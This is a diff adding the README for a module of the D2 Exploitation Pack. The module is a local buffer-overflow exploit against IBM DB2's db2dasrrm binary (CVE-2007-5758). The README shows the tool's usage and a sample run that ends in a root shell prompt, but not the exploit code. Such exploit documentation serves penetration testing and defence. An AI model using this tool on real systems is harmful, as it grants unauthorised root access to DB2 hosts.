@@ -1,0 +1,34 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+IBM DB2 Universal Database db2dasrrm Buffer Overflow Vulnerability
+
+Tested on Debian 4.0 with /proc/sys/kernel/randomize_va_space = 0
+and with IBM DB2 9.1
+
+CVE Name : CVE-2007-5758
+CVE URL  : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5758
+
+How to use the exploit
+------------------------
+
+$ ./d2sec_db2dasrrm 
+D2SEC (c) 2007-2009 IBM DB2 db2dasrrm exploit
+
+Usage: /tmp/d2sec_db2dasrrm <db2dasrrm pathname>
+$ ./d2sec_db2dasrrm /opt/ibm/db2/V9.1/das/adm/db2dasrrm 
+D2SEC (c) 2007-2009 IBM DB2 db2dasrrm exploit
+
+sh-3.1# 
